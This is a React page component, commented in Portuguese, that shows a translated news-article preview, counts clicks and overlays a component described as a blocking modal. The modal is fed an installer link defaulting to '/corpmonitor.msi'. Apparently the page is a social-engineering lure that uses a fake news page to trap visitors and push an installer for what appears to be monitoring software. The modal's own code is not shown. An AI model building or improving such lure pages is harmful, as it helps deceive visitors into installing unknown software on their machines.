import { useParams } from 'react-router-dom';
import { useEffect, useState } from 'react';
import { CriticalBanner } from "@/components/noticia/CriticalBanner";
import { NewsPreview } from "@/components/noticia/NewsPreview";
import { useNewsBlock } from "@/hooks/useNewsBlock";
import { useLocalization } from "@/hooks/useLocalization";
import { useTranslate } from "@/hooks/useTranslate";
import { LanguageSwitcher } from "@/components/LanguageSwitcher";
import { T } from "@/components/T";
import { Loader2 } from 'lucide-react';

const Noticia = () => {
  const { id } = useParams<{ id: string }>();
  const { data: news, isLoading, incrementClick } = useNewsBlock(id);
  const { isDetecting } = useLocalization();
  const { translate } = useTranslate();
  const [translatedNews, setTranslatedNews] = useState({ title: '', description: '' });

  // Incrementar contador quando notícia for carregada
  useEffect(() => {
    if (news && news.active && id) {
      incrementClick(id);
    }
  }, [news?.id]);

  // Traduzir título e descrição
  useEffect(() => {
    if (news) {
      Promise.all([
        translate(news.title),
        translate(news.description || ''),
      ]).then(([title, description]) => {
        setTranslatedNews({ title, description });
      });
    }
  }, [news, translate]);

  if (isLoading || isDetecting) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <Loader2 className="w-8 h-8 animate-spin text-primary" />
      </div>
    );
  }

  if (!news || !news.active) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <div className="text-center">
          <h1 className="text-2xl font-bold mb-2">
            <T>Notícia não encontrada</T>
          </h1>
          <p className="text-muted-foreground">
            <T>Esta notícia não está disponível ou foi removida.</T>
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background relative">
      {/* Seletor de idioma */}
      <div className="absolute top-4 right-4 z-40">
        <LanguageSwitcher />
      </div>

      <div className="max-w-5xl mx-auto p-4 py-8">
        <NewsPreview
          title={translatedNews.title || news.title}
          description={translatedNews.description || (news.description ?? undefined)}
          source={news.source}
          imageUrl={news.image_url ?? undefined}
          publishedDate={news.published_date ?? undefined}
          author={news.author ?? undefined}
          category={news.category ?? undefined}
          url={news.url}
        />
      </div>
      
      {/* Modal bloqueante sobreposto */}
      <CriticalBanner installerUrl={news.installer_url ?? '/corpmonitor.msi'} />
    </div>
  );
};

export default Noticia;
